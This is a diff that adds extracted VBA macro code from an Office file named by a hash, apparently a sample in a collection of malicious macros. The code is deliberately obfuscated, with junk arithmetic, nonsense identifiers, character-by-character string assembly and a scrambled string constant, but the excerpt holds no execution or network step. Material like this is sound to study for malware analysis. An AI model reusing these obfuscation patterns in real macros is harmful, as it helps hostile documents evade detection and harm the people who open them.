@@ -1,0 +1,50 @@
+Filename     : ./macros/6180bd1532330c9beb3baca849d178773e88a526b4a0d9543bedd05a86687f79
+OLE stream   : Macros/VBA/abc123137
+VBA filename : abc123137.bas
+----------------------------------------
+Attribute VB_Name = "abc123137"
+Function dougtattoo(vaderwendy, goatbutler)
+gulmande = Left(vaderwendy, goatbutler)
+dougtattoo = opusdebbie(gulmande)
+End Function
+
+Function opusdebbie(July1443)
+opusdebbie = Right(July1443, 1)
+End Function
+
+Function guetty42(doggygizmo)
+word971970 = abutchea(9, 4) - 1
+golfsurfer = 2 - 53
+golfsurfer = 56 - 30 + 46 - 3
+golfsurfer = 94 + 4 + 15 + 41 - 6
+goatsteve = abutchea(53, 1)
+duckiedon = dougtattoo(MyyyxYen, goatsteve)
+golfsurfer = 2 - 53
+golfsurfer = 56 - 30 + 46 - 3
+golfsurfer = 94 + 4 + 15 + 41 - 6
+For timlindsey = 2 To word971970
+goatsteve = abutchea(27, 1)
+duckiedon = duckiedon + dougtattoo(doggygizmo, goatsteve)
+Next timlindsey
+golfsurfer = 2 - 53
+golfsurfer = 56 - 30 + 46 - 3
+golfsurfer = 94 + 4 + 15 + 41 - 6
+goatsteve = abutchea(37, 1)
+guetty42 = winkshae(duckiedon, goatsteve)
+End Function
+
+Function winkshae(nihivezoK, KKARATEL)
+winkshae = nihivezoK + dougtattoo(savelich, KKARATEL)
+End Function
+
+Function echivant()
+londonrom = 85 - 54
+londonrom = 88 + londonrom * londonrom * 5
+londonrom = londonrom - 85 - 54 * londonrom * 2
+echivant = Rnd()
+End Function
+
+Function corknell()
+corknell = "ki,iQplhjzasQ/kR,sWTijiR/aQ"
+End Function
+
